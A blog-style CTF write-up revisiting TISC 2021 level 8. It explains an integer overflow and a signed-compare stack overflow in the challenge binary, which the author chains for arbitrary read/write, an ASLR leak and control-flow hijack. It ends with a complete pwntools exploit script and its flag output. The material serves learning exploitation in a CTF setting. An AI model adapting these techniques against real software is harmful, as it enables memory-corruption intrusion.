---
layout: post
title:  "2021 Signed Compare Adventure: revisiting TISC 2021 level 8"
date:   2022-01-13 11:56:46 +0800
categories: ctf writeup tisc-2021
---

Recently, somewhat bothered by the solution I came up with in the contest (and wanting to *really* understand the program), I decided to re-attempt the pwn challenge from level 8 of TISC 2021 the "intended" way (a heap-related exploit). You can find my original post with my alternate solution [here]({% post_url 2021-12-11-tisc-2021 %}#8-get-schwifty).

I did not solve this 100% on my own; I had a chat with the challenge creator after the competition ended where he gave a brief overview of what the general idea behind the intended exploit was. Afterwards, he gave me a small push in the direction of the vulnerability I needed to get started, and I managed to piece most of the rest of it on my own.

This exploit relies on two distinct vulnerabilities, each of which allow us to do something different. It's easiest to understand if I take them separately, but first...

### Understanding the program

![hi, remember me?](/assets/tisc-2021/8_10.png)

I already gave a high-level overview of what the program does in my writeup (shown above), but since my exploit did not rely on 90% of the program's functionality, it doesn't really go into detail about the inner workings of the functions in the main bulk of the program that deals with string manipulation. Here's the additional stuff that we need to know:

* Linked list nodes have a memory layout as shown below:
  
  ![linked list node layout](/assets/tisc-2021/8x_node_layout.png)
  
  All nodes are dynamically allocated on the heap, except the first node, which is **stored as a global variable**. Furthermore, as you can see, this is a **doubly linked list**. (These facts are important for the first half of the exploit.)

* A little bit of elaboration on the string manipulation functions (since they were skimmed over in the image above):
	* Initially entering the string manipulation menu requires inputting one string, which will be saved in the linked list head (in global data) after a sequence of weird and unnecessary copies. It's supposed to reject any input longer than 2048 characters, but the length check is vulnerable and can cause a buffer overflow on the stack.
	* "Append string" simply requests a string, then creates a new node with it and adds it to the end of the linked list. This string is also limited to at most 2048 characters, and the length check is **not** vulnerable.
	* "Replace string" requests a node and a string (the head node can't be selected), then updates the node's size before replacing the string stored in the node's vector with the new string iteratively (expanding the allocation if necessary). There is **no** check for string length here.
	* "Modify string" requests a node and two indices (start and end), followed by a string of length `end-start` (note that `start` and `end` must both be less than or equal to 2048). Let's call the string stored in the node `s`; the function then replaces `s[start:end]` with the our given input, leaving the rest of `s` untouched.
	* "Show what you have" iterates through the linked list and prints all the strings in sequence. If the length of a string exceeds 2048, only the first 2048 characters of each string will be printed.
	* "Submit" (still) does absolutely nothing useful, and isn't relevant to the exploit.

Now, let's work out our attack strategy first, before we start figuring out how to make each step happen.

### The goal

The general plan looks something like this:

1. Set up the heap such that it looks something like this:
   
   ![the plan](/assets/tisc-2021/8x_plan1.png)

2. Somehow corrupt the `length` field of node #x to a large value. This allows us to read (using "show what you have") and write (using "modify string") up to 2048 bytes beyond the start of string #x.

3. Read off the value of the `prev` pointer in node #y using the OOB read.

4. Using "modify string", we can replace the start pointer of string #y (stored in node #y) with the pointer we just obtained to be able to read the contents of node #(y-1), and hence access its `prev` pointer.

5. Rinse and repeat step 4 until we recover the address of the head node, which is at a known offset from the program's base address (`+0x92a0`). This allows us to calculate the address of the win function, located at `base_address+0x3bbc`.

6. Use the stack buffer overflow (mentioned earlier) to hijack the instruction pointer.

### You must have <========== T H I S M U C H ==========> RAM to get the flag

After a helpful hint from the challenge creator to narrow down my search for the first vulnerability, I found it here, in one of the subroutines called by "replace string":

![exploit 1](/assets/tisc-2021/8x_exploit1.png)

As you can see, the program does the equivalent of:

```c++
node.size = new_string_len;
node.vec.clear();
for (int i=0;i<new_string_len;i++) {
    node.vec.push_back(new_string[i]);
}
```

It's easy to see that if `new_string_len` is larger than 2147483647, the vector will be cleared and nothing will be written to it. However, I refused to believe that this was indeed the intended way to progress (who passes in a string that long?) until I checked with the challenge creator and he confirmed that this was indeed the solution. He also recommended allocating more RAM to my VM to do this; the kernel killed the process prematurely until I had allocated 12GB to it.

*WHAT.*

With that out of the way, I set about arranging my heap to prepare it for this vulnerability. After some trial and error, I managed to get it to look like this:

![heap setup](/assets/tisc-2021/8x_heap.png)

Then, I can call "replace string" on string #1 and supply a new string of length `0x80000000`. The contents of string #1 will remain intact (because nothing gets copied over due to the integer overflow), but I will now be able to use "modify string" on indices beyond the end of the string, up to 2048 bytes away from the start of the string.

In particular, by playing around with the `size` and `start_ptr` fields of node #2, I can obtain arbitrary read and write primitives:

![arb read/write](/assets/tisc-2021/8x_heap2.png)

### Signed compare 2: electric boogaloo

To understand this vulnerability, we must first trace the weird sequence of copies that the program performs after accepting input for the head node:

![exploit 2](/assets/tisc-2021/8x_exploit2.png)

Furthermore, instead of directly calling the string manipulation menu function once done, the program performs the following computation instead:

![literally why](/assets/tisc-2021/8x_eip_hijack.png)

Since it's reasonable to expect that the high dword of pretty much any instruction address in such a small program would be the same, most of this code does absolutely nothing, and can be condensed to `call (address of string_edit_function saved on stack)`. All we need to do is to overwrite the relevant variable on the stack with the address of the win function, and we're done.

Doing this is not particularly difficult, thanks to the signed compare mentioned earlier. Since the signed comparison is done between `ax` (the lowest 16 bits of the length of the string) and `0x800`, a string of any length from `0x????8000` to `0x????FFFF` will pass the check. We don't have to worry about corrupting the stack because there are more than `0x10000` bytes of padding between the buffer overflow and the rest of the stack.

One or two minor details before we're done:

1. As part of normal program execution, all old linked list nodes and their corresponding strings will be freed first. Since we tampered with the pointers to these strings to break ASLR earlier, this will cause a crash on `free()` unless we overwrite the `next` pointer of the head node with a null pointer to trick the program into thinking that there's nothing to be freed.

2. `cin` will stop reading if we reach a whitespace character, which will cause the program to read not all of our payload. The sanity check XOR helps us in this way, and we can choose a character sequence that makes this less likely. It's not 100% avoidable because there's always a chance such a character will show up in one of the leaked addresses though.

### Putting it all together

This is all we need to piece together the whole exploit and recover the flag.

```python
from pwn import *

# Note: many of the steps have a small chance to fail if a misbehaving character shows up in the payload (e.g. \n).
# There's nothing much I can do about that.

def p64_xor(addr):
    r = []
    for i in range(8):
        r += [(addr%256)^48]
        addr //= 256
    return bytes(r)
	
def ptr_int(byte_arr):
    r = 0
    for i in range(8):
        r += byte_arr[i]*(256**i)
    return r

p = process("./some_program")

# Pass the sanity check
p.sendlineafter(b"//////////////////////////////////", b"1")
p.sendlineafter(b"Your answer: ", b"0"*80)

# Head node (#0)
p.sendlineafter(b"//////////////////////////////////", b"2")
p.sendlineafter(b"Passphrase: ",b"A")

# Append a node (#1)
p.sendlineafter(b"> ",b"1")
p.sendlineafter(b"Enter string: ",b"B"*0x100)

# Append another node (#2)
p.sendlineafter(b"> ",b"1")
p.sendlineafter(b"Enter string: ",b"C"*0x100)

# Corrupt node 1
p.sendlineafter(b"> ",b"2")
p.sendlineafter(b"replace: ",b"1")
p.sendlineafter(b"with: ",b"D"*0x80000000)

# Leak the address of node 1 by reading node 2's prev field
p.sendlineafter(b"> ",b"4")
for i in range(17):
    r = p.recvline(timeout=10)
r = p.recvuntil(b"Use the",drop=True)
node1_addr = ptr_int(r[313:321])

# Leak the address of node 0 in global data
p.sendlineafter(b"> ",b"3")
p.sendlineafter(b"modify: ",b"1")
p.sendlineafter(b"Enter start index: ",b"272")
p.sendlineafter(b"Enter end: ",b"288")
p.sendlineafter(b"String: ",b"80000000"+p64_xor(node1_addr+0x28))

p.sendlineafter(b"> ",b"4")
for i in range(17):
    r = p.recvline(timeout=10)
r = p.recvuntil(b"Use the",drop=True)
base_addr = ptr_int(r[2050:2058])-0x92a0 # Yay!
win_addr = base_addr+0x3bbc

# We need to make sure head->next = NULL before we proceed, or the program will complain while trying to free old nodes
p.sendlineafter(b"> ",b"3")
p.sendlineafter(b"modify: ",b"1")
p.sendlineafter(b"Enter start index: ",b"272")
p.sendlineafter(b"Enter end: ",b"288")
p.sendlineafter(b"String: ",b"80000000"+p64_xor(base_addr+0x92c0))

p.sendlineafter(b"> ",b"3")
p.sendlineafter(b"modify: ",b"2")
p.sendlineafter(b"Enter start index: ",b"0")
p.sendlineafter(b"Enter end: ",b"8")
p.sendlineafter(b"String: ",b"00000000")

# Hijack EIP
p.sendlineafter(b"> ",b"6")
p.sendlineafter(b"//////////////////////////////////", b"2")
p.sendlineafter(b"Passphrase: ",b"0"*2112+p64_xor(win_addr)+b"0"*32000) # Total length must be above 0x8000, below 0x10000
r = p.recvall(timeout=2)
print(r)
```

```console
amarok@ubuntu:~/tisc$ python3 level8_heap.py
[+] Starting local process './some_program': pid 21357
[+] Receiving all data: Done (292B)
[*] Stopped process './some_program' (pid 21357)
b'flag{i_planted_this_flag_on_my_vm_because_challenge_servers_are_no_longer_up}\n\n\n////////////// MENU //////////////\n//  0. Help                     //\n//  1. Do Sanity Test           //\n//  2. Get Recruited            //\n//  3. Exit Program             //\n//////////////////////////////////\n> '
```